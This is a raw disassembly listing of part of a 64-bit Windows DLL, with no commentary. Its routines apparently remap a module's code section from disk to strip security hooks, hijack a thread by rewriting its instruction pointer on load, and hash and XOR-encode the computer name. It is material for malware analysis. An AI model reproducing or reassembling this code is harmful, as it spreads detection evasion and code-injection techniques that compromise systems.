   180002d36:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   180002d3b:	48 8d 8c 24 90 20 00 	lea    0x2090(%rsp),%rcx
   180002d42:	00 
   180002d43:	45 33 c9             	xor    %r9d,%r9d
   180002d46:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   180002d4b:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   180002d4f:	ba 00 00 00 80       	mov    $0x80000000,%edx
   180002d54:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   180002d5b:	00 
   180002d5c:	45 8d 41 01          	lea    0x1(%r9),%r8d
   180002d60:	ff 15 32 13 01 00    	call   *0x11332(%rip)        # 0x180014098
   180002d66:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   180002d6b:	45 33 c9             	xor    %r9d,%r9d
   180002d6e:	48 8b c8             	mov    %rax,%rcx
   180002d71:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180002d76:	33 d2                	xor    %edx,%edx
   180002d78:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   180002d7c:	41 b8 02 00 00 01    	mov    $0x1000002,%r8d
   180002d82:	ff 15 88 13 01 00    	call   *0x11388(%rip)        # 0x180014110
   180002d88:	45 33 c9             	xor    %r9d,%r9d
   180002d8b:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180002d90:	45 33 c0             	xor    %r8d,%r8d
   180002d93:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   180002d98:	48 8b c8             	mov    %rax,%rcx
   180002d9b:	41 8d 51 04          	lea    0x4(%r9),%edx
   180002d9f:	ff 15 73 13 01 00    	call   *0x11373(%rip)        # 0x180014118
   180002da5:	48 63 75 3c          	movslq 0x3c(%rbp),%rsi
   180002da9:	4c 8b f8             	mov    %rax,%r15
   180002dac:	48 03 f5             	add    %rbp,%rsi
   180002daf:	33 c0                	xor    %eax,%eax
   180002db1:	66 3b 46 06          	cmp    0x6(%rsi),%ax
   180002db5:	0f 83 a6 00 00 00    	jae    0x180002e61
   180002dbb:	45 33 e4             	xor    %r12d,%r12d
   180002dbe:	66 90                	xchg   %ax,%ax
   180002dc0:	0f b7 4e 14          	movzwl 0x14(%rsi),%ecx
   180002dc4:	0f b7 c7             	movzwl %di,%eax
   180002dc7:	48 03 ce             	add    %rsi,%rcx
   180002dca:	48 8d 14 80          	lea    (%rax,%rax,4),%rdx
   180002dce:	49 8b c4             	mov    %r12,%rax
   180002dd1:	48 8d 1c d1          	lea    (%rcx,%rdx,8),%rbx
   180002dd5:	48 8d 15 c0 93 01 00 	lea    0x193c0(%rip),%rdx        # 0x18001c19c
   180002ddc:	0f 1f 40 00          	nopl   0x0(%rax)
   180002de0:	0f b6 4c 03 18       	movzbl 0x18(%rbx,%rax,1),%ecx
   180002de5:	48 ff c0             	inc    %rax
   180002de8:	3a 4c 02 ff          	cmp    -0x1(%rdx,%rax,1),%cl
   180002dec:	75 5c                	jne    0x180002e4a
   180002dee:	48 83 f8 06          	cmp    $0x6,%rax
   180002df2:	75 ec                	jne    0x180002de0
   180002df4:	8b 4b 24             	mov    0x24(%rbx),%ecx
   180002df7:	4c 8d 8c 24 80 00 00 	lea    0x80(%rsp),%r9
   180002dfe:	00 
   180002dff:	8b 53 20             	mov    0x20(%rbx),%edx
   180002e02:	44 8d 40 3a          	lea    0x3a(%rax),%r8d
   180002e06:	48 03 cd             	add    %rbp,%rcx
   180002e09:	44 89 a4 24 80 00 00 	mov    %r12d,0x80(%rsp)
   180002e10:	00 
   180002e11:	ff 15 29 13 01 00    	call   *0x11329(%rip)        # 0x180014140
   180002e17:	8b 43 24             	mov    0x24(%rbx),%eax
   180002e1a:	44 8b 43 20          	mov    0x20(%rbx),%r8d
   180002e1e:	4a 8d 14 38          	lea    (%rax,%r15,1),%rdx
   180002e22:	48 8d 0c 28          	lea    (%rax,%rbp,1),%rcx
   180002e26:	e8 15 f9 00 00       	call   0x180012740
   180002e2b:	8b 4b 24             	mov    0x24(%rbx),%ecx
   180002e2e:	4c 8d 8c 24 80 00 00 	lea    0x80(%rsp),%r9
   180002e35:	00 
   180002e36:	8b 53 20             	mov    0x20(%rbx),%edx
   180002e39:	48 03 cd             	add    %rbp,%rcx
   180002e3c:	44 8b 84 24 80 00 00 	mov    0x80(%rsp),%r8d
   180002e43:	00 
   180002e44:	ff 15 f6 12 01 00    	call   *0x112f6(%rip)        # 0x180014140
   180002e4a:	66 ff c7             	inc    %di
   180002e4d:	66 3b 7e 06          	cmp    0x6(%rsi),%di
   180002e51:	0f 82 69 ff ff ff    	jb     0x180002dc0
   180002e57:	4c 8b 64 24 40       	mov    0x40(%rsp),%r12
   180002e5c:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   180002e61:	49 8b cf             	mov    %r15,%rcx
   180002e64:	ff 15 e6 11 01 00    	call   *0x111e6(%rip)        # 0x180014050
   180002e6a:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180002e6f:	ff 15 2b 12 01 00    	call   *0x1122b(%rip)        # 0x1800140a0
   180002e75:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180002e7a:	ff 15 20 12 01 00    	call   *0x11220(%rip)        # 0x1800140a0
   180002e80:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   180002e85:	ff 15 5d 12 01 00    	call   *0x1125d(%rip)        # 0x1800140e8
   180002e8b:	33 ff                	xor    %edi,%edi
   180002e8d:	eb 06                	jmp    0x180002e95
   180002e8f:	41 bd 01 00 00 00    	mov    $0x1,%r13d
   180002e95:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   180002e99:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180002e9f:	48 8d 15 02 93 01 00 	lea    0x19302(%rip),%rdx        # 0x18001c1a8
   180002ea6:	e8 b5 50 00 00       	call   0x180007f60
   180002eab:	85 c0                	test   %eax,%eax
   180002ead:	74 16                	je     0x180002ec5
   180002eaf:	8b 84 24 84 00 00 00 	mov    0x84(%rsp),%eax
   180002eb6:	41 ff c6             	inc    %r14d
   180002eb9:	c1 e8 03             	shr    $0x3,%eax
   180002ebc:	44 3b f0             	cmp    %eax,%r14d
   180002ebf:	0f 82 ef fd ff ff    	jb     0x180002cb4
   180002ec5:	48 8b 9c 24 e0 21 00 	mov    0x21e0(%rsp),%rbx
   180002ecc:	00 
   180002ecd:	48 8b b4 24 f0 21 00 	mov    0x21f0(%rsp),%rsi
   180002ed4:	00 
   180002ed5:	48 8b ac 24 e8 21 00 	mov    0x21e8(%rsp),%rbp
   180002edc:	00 
   180002edd:	4c 8b bc 24 b0 21 00 	mov    0x21b0(%rsp),%r15
   180002ee4:	00 
   180002ee5:	4c 8b b4 24 b8 21 00 	mov    0x21b8(%rsp),%r14
   180002eec:	00 
   180002eed:	49 8b cc             	mov    %r12,%rcx
   180002ef0:	ff 15 aa 11 01 00    	call   *0x111aa(%rip)        # 0x1800140a0
   180002ef6:	48 8b 8c 24 a0 21 00 	mov    0x21a0(%rsp),%rcx
   180002efd:	00 
   180002efe:	48 33 cc             	xor    %rsp,%rcx
   180002f01:	e8 aa 0c 00 00       	call   0x180003bb0
   180002f06:	48 81 c4 c0 21 00 00 	add    $0x21c0,%rsp
   180002f0d:	41 5d                	pop    %r13
   180002f0f:	41 5c                	pop    %r12
   180002f11:	5f                   	pop    %rdi
   180002f12:	c3                   	ret
   180002f13:	cc                   	int3
   180002f14:	cc                   	int3
   180002f15:	cc                   	int3
   180002f16:	cc                   	int3
   180002f17:	cc                   	int3
   180002f18:	cc                   	int3
   180002f19:	cc                   	int3
   180002f1a:	cc                   	int3
   180002f1b:	cc                   	int3
   180002f1c:	cc                   	int3
   180002f1d:	cc                   	int3
   180002f1e:	cc                   	int3
   180002f1f:	cc                   	int3
   180002f20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002f25:	57                   	push   %rdi
   180002f26:	48 81 ec 60 06 00 00 	sub    $0x660,%rsp
   180002f2d:	48 8b 05 d4 c0 01 00 	mov    0x1c0d4(%rip),%rax        # 0x18001f008
   180002f34:	48 33 c4             	xor    %rsp,%rax
   180002f37:	48 89 84 24 50 06 00 	mov    %rax,0x650(%rsp)
   180002f3e:	00 
   180002f3f:	8b fa                	mov    %edx,%edi
   180002f41:	ff 15 69 11 01 00    	call   *0x11169(%rip)        # 0x1800140b0
   180002f47:	83 ff 01             	cmp    $0x1,%edi
   180002f4a:	0f 85 1e 01 00 00    	jne    0x18000306e
   180002f50:	ff 15 e2 11 01 00    	call   *0x111e2(%rip)        # 0x180014138
   180002f56:	48 8d bc 24 40 05 00 	lea    0x540(%rsp),%rdi
   180002f5d:	00 
   180002f5e:	b9 04 01 00 00       	mov    $0x104,%ecx
   180002f63:	48 8b d8             	mov    %rax,%rbx
   180002f66:	48 8d 94 24 40 05 00 	lea    0x540(%rsp),%rdx
   180002f6d:	00 
   180002f6e:	33 c0                	xor    %eax,%eax
   180002f70:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180002f76:	f3 aa                	rep stos %al,(%rdi)
   180002f78:	48 8b cb             	mov    %rbx,%rcx
   180002f7b:	ff 15 a7 10 01 00    	call   *0x110a7(%rip)        # 0x180014028
   180002f81:	85 c0                	test   %eax,%eax
   180002f83:	0f 84 e5 00 00 00    	je     0x18000306e
   180002f89:	48 8d 15 88 91 01 00 	lea    0x19188(%rip),%rdx        # 0x18001c118
   180002f90:	48 8d 8c 24 40 05 00 	lea    0x540(%rsp),%rcx
   180002f97:	00 
   180002f98:	e8 47 1d 00 00       	call   0x180004ce4
   180002f9d:	48 85 c0             	test   %rax,%rax
   180002fa0:	0f 84 c8 00 00 00    	je     0x18000306e
   180002fa6:	48 8d 0d a7 91 01 00 	lea    0x191a7(%rip),%rcx        # 0x18001c154
   180002fad:	ff 15 a5 10 01 00    	call   *0x110a5(%rip)        # 0x180014058
   180002fb3:	48 8b c8             	mov    %rax,%rcx
   180002fb6:	48 8d 15 7b 91 01 00 	lea    0x1917b(%rip),%rdx        # 0x18001c138
   180002fbd:	ff 15 0d 11 01 00    	call   *0x1110d(%rip)        # 0x1800140d0
   180002fc3:	48 85 c0             	test   %rax,%rax
   180002fc6:	0f 84 a2 00 00 00    	je     0x18000306e
   180002fcc:	33 c9                	xor    %ecx,%ecx
   180002fce:	4c 8b cb             	mov    %rbx,%r9
   180002fd1:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   180002fd6:	45 33 c0             	xor    %r8d,%r8d
   180002fd9:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   180002fde:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   180002fe3:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   180002fe8:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   180002fed:	c7 44 24 30 05 00 00 	movl   $0x5,0x30(%rsp)
   180002ff4:	00 
   180002ff5:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180002ffa:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   180002fff:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180003004:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003009:	e8 52 0b 00 00       	call   0x180003b60
   18000300e:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   180003013:	48 85 c9             	test   %rcx,%rcx
   180003016:	74 56                	je     0x18000306e
   180003018:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   18000301d:	c7 84 24 a0 00 00 00 	movl   $0x10000b,0xa0(%rsp)
   180003024:	0b 00 10 00 
   180003028:	ff 15 9a 10 01 00    	call   *0x1109a(%rip)        # 0x1800140c8
   18000302e:	85 c0                	test   %eax,%eax
   180003030:	75 07                	jne    0x180003039
   180003032:	b8 03 00 00 00       	mov    $0x3,%eax
   180003037:	eb 3a                	jmp    0x180003073
   180003039:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   18000303e:	48 8d 05 db 05 00 00 	lea    0x5db(%rip),%rax        # 0x180003620
   180003045:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   18000304a:	48 89 84 24 f0 00 00 	mov    %rax,0xf0(%rsp)
   180003051:	00 
   180003052:	ff 15 c8 10 01 00    	call   *0x110c8(%rip)        # 0x180014120
   180003058:	85 c0                	test   %eax,%eax
   18000305a:	75 07                	jne    0x180003063
   18000305c:	b8 02 00 00 00       	mov    $0x2,%eax
   180003061:	eb 10                	jmp    0x180003073
   180003063:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   180003068:	ff 15 da 0f 01 00    	call   *0x10fda(%rip)        # 0x180014048
   18000306e:	b8 01 00 00 00       	mov    $0x1,%eax
   180003073:	48 8b 8c 24 50 06 00 	mov    0x650(%rsp),%rcx
   18000307a:	00 
   18000307b:	48 33 cc             	xor    %rsp,%rcx
   18000307e:	e8 2d 0b 00 00       	call   0x180003bb0
   180003083:	48 8b 9c 24 70 06 00 	mov    0x670(%rsp),%rbx
   18000308a:	00 
   18000308b:	48 81 c4 60 06 00 00 	add    $0x660,%rsp
   180003092:	5f                   	pop    %rdi
   180003093:	c3                   	ret
   180003094:	cc                   	int3
   180003095:	cc                   	int3
   180003096:	cc                   	int3
   180003097:	cc                   	int3
   180003098:	cc                   	int3
   180003099:	cc                   	int3
   18000309a:	cc                   	int3
   18000309b:	cc                   	int3
   18000309c:	cc                   	int3
   18000309d:	cc                   	int3
   18000309e:	cc                   	int3
   18000309f:	cc                   	int3
   1800030a0:	33 c0                	xor    %eax,%eax
   1800030a2:	c3                   	ret
   1800030a3:	cc                   	int3
   1800030a4:	cc                   	int3
   1800030a5:	cc                   	int3
   1800030a6:	cc                   	int3
   1800030a7:	cc                   	int3
   1800030a8:	cc                   	int3
   1800030a9:	cc                   	int3
   1800030aa:	cc                   	int3
   1800030ab:	cc                   	int3
   1800030ac:	cc                   	int3
   1800030ad:	cc                   	int3
   1800030ae:	cc                   	int3
   1800030af:	cc                   	int3
   1800030b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800030b5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800030ba:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1800030bf:	55                   	push   %rbp
   1800030c0:	41 54                	push   %r12
   1800030c2:	41 55                	push   %r13
   1800030c4:	41 56                	push   %r14
   1800030c6:	41 57                	push   %r15
   1800030c8:	48 8d ac 24 c0 f9 ff 	lea    -0x640(%rsp),%rbp
   1800030cf:	ff 
   1800030d0:	48 81 ec 40 07 00 00 	sub    $0x740,%rsp
   1800030d7:	48 8b 05 2a bf 01 00 	mov    0x1bf2a(%rip),%rax        # 0x18001f008
   1800030de:	48 33 c4             	xor    %rsp,%rax
   1800030e1:	48 89 85 30 06 00 00 	mov    %rax,0x630(%rbp)
   1800030e8:	e8 23 fb ff ff       	call   0x180002c10
   1800030ed:	45 33 ff             	xor    %r15d,%r15d
   1800030f0:	4c 8d 35 31 d1 01 00 	lea    0x1d131(%rip),%r14        # 0x180020228
   1800030f7:	e8 e4 e7 ff ff       	call   0x1800018e0
   1800030fc:	48 8b f0             	mov    %rax,%rsi
   1800030ff:	c7 44 24 50 04 01 00 	movl   $0x104,0x50(%rsp)
   180003106:	00 
   180003107:	33 c0                	xor    %eax,%eax
   180003109:	48 8d bd e0 00 00 00 	lea    0xe0(%rbp),%rdi
   180003110:	b9 04 01 00 00       	mov    $0x104,%ecx
   180003115:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   18000311a:	f3 aa                	rep stos %al,(%rdi)
   18000311c:	8d 48 02             	lea    0x2(%rax),%ecx
   18000311f:	48 8d 95 e0 00 00 00 	lea    0xe0(%rbp),%rdx
   180003126:	ff 15 14 12 01 00    	call   *0x11214(%rip)        # 0x180014340
   18000312c:	48 8d 85 e0 00 00 00 	lea    0xe0(%rbp),%rax
   180003133:	4c 89 7c 24 60       	mov    %r15,0x60(%rsp)
   180003138:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   18000313c:	c7 44 24 68 01 23 45 	movl   $0x67452301,0x68(%rsp)
   180003143:	67 
   180003144:	c7 44 24 6c 89 ab cd 	movl   $0xefcdab89,0x6c(%rsp)
   18000314b:	ef 
   18000314c:	c7 44 24 70 fe dc ba 	movl   $0x98badcfe,0x70(%rsp)
   180003153:	98 
   180003154:	c7 44 24 74 76 54 32 	movl   $0x10325476,0x74(%rsp)
   18000315b:	10 
   18000315c:	0f 1f 40 00          	nopl   0x0(%rax)
   180003160:	49 ff c0             	inc    %r8
   180003163:	42 80 3c 00 00       	cmpb   $0x0,(%rax,%r8,1)
   180003168:	75 f6                	jne    0x180003160
   18000316a:	48 8d 95 e0 00 00 00 	lea    0xe0(%rbp),%rdx
   180003171:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180003176:	e8 15 ee ff ff       	call   0x180001f90
   18000317b:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180003180:	e8 0b ef ff ff       	call   0x180002090
   180003185:	b9 10 00 00 00       	mov    $0x10,%ecx
   18000318a:	e8 31 4b 00 00       	call   0x180007cc0
   18000318f:	0f 10 45 b8          	movups -0x48(%rbp),%xmm0
   180003193:	b9 04 01 00 00       	mov    $0x104,%ecx
   180003198:	48 8b d8             	mov    %rax,%rbx
   18000319b:	0f 11 00             	movups %xmm0,(%rax)
   18000319e:	e8 31 0a 00 00       	call   0x180003bd4
   1800031a3:	48 8b f8             	mov    %rax,%rdi
   1800031a6:	4c 8b e8             	mov    %rax,%r13
   1800031a9:	33 c0                	xor    %eax,%eax
   1800031ab:	b9 04 01 00 00       	mov    $0x104,%ecx
   1800031b0:	f3 aa                	rep stos %al,(%rdi)
   1800031b2:	8d 78 10             	lea    0x10(%rax),%edi
   1800031b5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1800031bc:	00 00 00 00 
   1800031c0:	0f b6 0b             	movzbl (%rbx),%ecx
   1800031c3:	4c 8d 05 62 8f 01 00 	lea    0x18f62(%rip),%r8        # 0x18001c12c
   1800031ca:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   1800031ce:	4d 8b cd             	mov    %r13,%r9
   1800031d1:	49 8b cd             	mov    %r13,%rcx
   1800031d4:	ba 04 01 00 00       	mov    $0x104,%edx
   1800031d9:	e8 22 f1 ff ff       	call   0x180002300
   1800031de:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   1800031e2:	48 83 ef 01          	sub    $0x1,%rdi
   1800031e6:	75 d8                	jne    0x1800031c0
   1800031e8:	48 85 f6             	test   %rsi,%rsi
   1800031eb:	0f 84 06 04 00 00    	je     0x1800035f7
   1800031f1:	e8 ba f4 ff ff       	call   0x1800026b0
   1800031f6:	4c 8b c6             	mov    %rsi,%r8
   1800031f9:	48 8d 15 b4 8f 01 00 	lea    0x18fb4(%rip),%rdx        # 0x18001c1b4
   180003200:	48 8d 8d 10 04 00 00 	lea    0x410(%rbp),%rcx
   180003207:	e8 24 ed ff ff       	call   0x180001f30
   18000320c:	33 c0                	xor    %eax,%eax
   18000320e:	c7 44 24 48 04 01 00 	movl   $0x104,0x48(%rsp)
   180003215:	00 
   180003216:	b9 04 01 00 00       	mov    $0x104,%ecx
   18000321b:	48 8d 7d d0          	lea    -0x30(%rbp),%rdi
   18000321f:	f3 aa                	rep stos %al,(%rdi)
   180003221:	48 8d bd 20 05 00 00 	lea    0x520(%rbp),%rdi
   180003228:	b9 04 01 00 00       	mov    $0x104,%ecx
   18000322d:	f3 aa                	rep stos %al,(%rdi)
   18000322f:	8d 48 02             	lea    0x2(%rax),%ecx
   180003232:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   180003237:	48 8d 95 20 05 00 00 	lea    0x520(%rbp),%rdx
   18000323e:	ff 15 fc 10 01 00    	call   *0x110fc(%rip)        # 0x180014340
   180003244:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   180003249:	b9 03 00 00 00       	mov    $0x3,%ecx
   18000324e:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   180003252:	ff 15 a8 0e 01 00    	call   *0x10ea8(%rip)        # 0x180014100
   180003258:	4c 8d 8d 20 05 00 00 	lea    0x520(%rbp),%r9
   18000325f:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   180003263:	48 8d 15 ba 8e 01 00 	lea    0x18eba(%rip),%rdx        # 0x18001c124
   18000326a:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   18000326e:	e8 bd ec ff ff       	call   0x180001f30
   180003273:	b9 04 01 00 00       	mov    $0x104,%ecx
   180003278:	e8 57 09 00 00       	call   0x180003bd4
   18000327d:	4c 8b e0             	mov    %rax,%r12
   180003280:	48 8b f8             	mov    %rax,%rdi
   180003283:	33 c0                	xor    %eax,%eax
   180003285:	b9 04 01 00 00       	mov    $0x104,%ecx
   18000328a:	f3 aa                	rep stos %al,(%rdi)
   18000328c:	4d 85 e4             	test   %r12,%r12
   18000328f:	75 1d                	jne    0x1800032ae
   180003291:	e8 02 4e 00 00       	call   0x180008098
   180003296:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000329c:	e8 3b 4c 00 00       	call   0x180007edc
   1800032a1:	45 8b df             	mov    %r15d,%r11d
   1800032a4:	4c 89 5c 24 48       	mov    %r11,0x48(%rsp)
   1800032a9:	e9 7e 00 00 00       	jmp    0x18000332c
   1800032ae:	49 8b cc             	mov    %r12,%rcx
   1800032b1:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   1800032b5:	ba 02 00 00 00       	mov    $0x2,%edx
   1800032ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1800032c0:	48 8d 89 80 00 00 00 	lea    0x80(%rcx),%rcx
   1800032c7:	0f 10 00             	movups (%rax),%xmm0
   1800032ca:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1800032ce:	48 8d 80 80 00 00 00 	lea    0x80(%rax),%rax
   1800032d5:	0f 11 41 80          	movups %xmm0,-0x80(%rcx)
   1800032d9:	0f 10 40 a0          	movups -0x60(%rax),%xmm0
   1800032dd:	0f 11 49 90          	movups %xmm1,-0x70(%rcx)
   1800032e1:	0f 10 48 b0          	movups -0x50(%rax),%xmm1
   1800032e5:	0f 11 41 a0          	movups %xmm0,-0x60(%rcx)
   1800032e9:	0f 10 40 c0          	movups -0x40(%rax),%xmm0
   1800032ed:	0f 11 49 b0          	movups %xmm1,-0x50(%rcx)
   1800032f1:	0f 10 48 d0          	movups -0x30(%rax),%xmm1
   1800032f5:	0f 11 41 c0          	movups %xmm0,-0x40(%rcx)
   1800032f9:	0f 10 40 e0          	movups -0x20(%rax),%xmm0
   1800032fd:	0f 11 49 d0          	movups %xmm1,-0x30(%rcx)
   180003301:	0f 10 48 f0          	movups -0x10(%rax),%xmm1
   180003305:	0f 11 41 e0          	movups %xmm0,-0x20(%rcx)
   180003309:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   18000330d:	48 83 ea 01          	sub    $0x1,%rdx
   180003311:	75 ad                	jne    0x1800032c0
   180003313:	8b 00                	mov    (%rax),%eax
   180003315:	ba 04 01 00 00       	mov    $0x104,%edx
   18000331a:	89 01                	mov    %eax,(%rcx)
   18000331c:	49 8b cc             	mov    %r12,%rcx
   18000331f:	e8 8c 46 00 00       	call   0x1800079b0
   180003324:	4c 8b d8             	mov    %rax,%r11
   180003327:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   18000332c:	41 8d 4b ff          	lea    -0x1(%r11),%ecx
   180003330:	4d 63 cb             	movslq %r11d,%r9
   180003333:	4c 63 d1             	movslq %ecx,%r10
   180003336:	49 8b d7             	mov    %r15,%rdx
   180003339:	85 c9                	test   %ecx,%ecx
   18000333b:	7e 4d                	jle    0x18000338a
   18000333d:	0f 1f 00             	nopl   (%rax)
   180003340:	4d 8b c6             	mov    %r14,%r8
   180003343:	41 8b ff             	mov    %r15d,%edi
   180003346:	4c 2b c2             	sub    %rdx,%r8
   180003349:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180003350:	49 3b d1             	cmp    %r9,%rdx
   180003353:	7d 30                	jge    0x180003385
   180003355:	41 0f b6 04 10       	movzbl (%r8,%rdx,1),%eax
   18000335a:	ff c7                	inc    %edi
   18000335c:	42 30 04 22          	xor    %al,(%rdx,%r12,1)
   180003360:	48 ff c2             	inc    %rdx
   180003363:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180003367:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000336e:	00 00 
   180003370:	48 ff c0             	inc    %rax
   180003373:	41 80 3c 06 00       	cmpb   $0x0,(%r14,%rax,1)
   180003378:	75 f6                	jne    0x180003370
   18000337a:	48 ff c8             	dec    %rax
   18000337d:	48 63 cf             	movslq %edi,%rcx
   180003380:	48 3b c8             	cmp    %rax,%rcx
   180003383:	76 cb                	jbe    0x180003350
   180003385:	49 3b d2             	cmp    %r10,%rdx
   180003388:	7c b6                	jl     0x180003340
   18000338a:	45 8d 73 28          	lea    0x28(%r11),%r14d
   18000338e:	49 63 ce             	movslq %r14d,%rcx
   180003391:	e8 3e 08 00 00       	call   0x180003bd4
   180003396:	4c 8b f8             	mov    %rax,%r15
   180003399:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   1800033a0:	00 00 
   1800033a2:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   1800033a6:	c7 44 24 68 01 23 45 	movl   $0x67452301,0x68(%rsp)
   1800033ad:	67 
   1800033ae:	c7 44 24 6c 89 ab cd 	movl   $0xefcdab89,0x6c(%rsp)
   1800033b5:	ef 
   1800033b6:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   1800033ba:	c7 44 24 70 fe dc ba 	movl   $0x98badcfe,0x70(%rsp)
   1800033c1:	98 
   1800033c2:	c7 44 24 74 76 54 32 	movl   $0x10325476,0x74(%rsp)
   1800033c9:	10 
   1800033ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1800033d0:	49 ff c0             	inc    %r8
   1800033d3:	42 80 3c 00 00       	cmpb   $0x0,(%rax,%r8,1)
   1800033d8:	75 f6                	jne    0x1800033d0
   1800033da:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   1800033de:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1800033e3:	e8 a8 eb ff ff       	call   0x180001f90
   1800033e8:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1800033ed:	e8 9e ec ff ff       	call   0x180002090
   1800033f2:	b9 10 00 00 00       	mov    $0x10,%ecx
   1800033f7:	e8 c4 48 00 00       	call   0x180007cc0
   1800033fc:	0f 10 45 b8          	movups -0x48(%rbp),%xmm0
   180003400:	b9 04 01 00 00       	mov    $0x104,%ecx
   180003405:	48 8b d8             	mov    %rax,%rbx
   180003408:	0f 11 00             	movups %xmm0,(%rax)
   18000340b:	e8 c4 07 00 00       	call   0x180003bd4
   180003410:	48 8b f8             	mov    %rax,%rdi
   180003413:	48 8b f0             	mov    %rax,%rsi
   180003416:	33 c0                	xor    %eax,%eax
   180003418:	b9 04 01 00 00       	mov    $0x104,%ecx
   18000341d:	f3 aa                	rep stos %al,(%rdi)
   18000341f:	8d 78 10             	lea    0x10(%rax),%edi
   180003422:	0f b6 0b             	movzbl (%rbx),%ecx
   180003425:	4c 8d 05 00 8d 01 00 	lea    0x18d00(%rip),%r8        # 0x18001c12c
   18000342c:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   180003430:	4c 8b ce             	mov    %rsi,%r9
   180003433:	48 8b ce             	mov    %rsi,%rcx
   180003436:	ba 04 01 00 00       	mov    $0x104,%edx
   18000343b:	e8 c0 ee ff ff       	call   0x180002300
   180003440:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   180003444:	48 83 ef 01          	sub    $0x1,%rdi
   180003448:	75 d8                	jne    0x180003422
   18000344a:	33 c0                	xor    %eax,%eax
   18000344c:	48 8d bd f0 01 00 00 	lea    0x1f0(%rbp),%rdi
   180003453:	b9 04 01 00 00       	mov    $0x104,%ecx
   180003458:	4c 8d 05 a9 8c 01 00 	lea    0x18ca9(%rip),%r8        # 0x18001c108
   18000345f:	f3 aa                	rep stos %al,(%rdi)
   180003461:	48 8d 05 a8 8c 01 00 	lea    0x18ca8(%rip),%rax        # 0x18001c110
   180003468:	4c 8b ce             	mov    %rsi,%r9
   18000346b:	48 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%rcx
   180003472:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003477:	48 8d 15 42 8d 01 00 	lea    0x18d42(%rip),%rdx        # 0x18001c1c0
   18000347e:	e8 ad ea ff ff       	call   0x180001f30
   180003483:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
   180003488:	4d 8b c4             	mov    %r12,%r8
   18000348b:	41 8b d6             	mov    %r14d,%edx
   18000348e:	49 8b cf             	mov    %r15,%rcx
   180003491:	e8 ca ee ff ff       	call   0x180002360
   180003496:	4c 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%r9
   18000349d:	45 8b c6             	mov    %r14d,%r8d
   1800034a0:	49 8b d7             	mov    %r15,%rdx
   1800034a3:	48 8d 8d 10 04 00 00 	lea    0x410(%rbp),%rcx
   1800034aa:	e8 e1 df ff ff       	call   0x180001490
   1800034af:	33 c0                	xor    %eax,%eax
   1800034b1:	48 8d bd 00 03 00 00 	lea    0x300(%rbp),%rdi
   1800034b8:	b9 04 01 00 00       	mov    $0x104,%ecx
   1800034bd:	4c 8d 85 f0 01 00 00 	lea    0x1f0(%rbp),%r8
   1800034c4:	f3 aa                	rep stos %al,(%rdi)
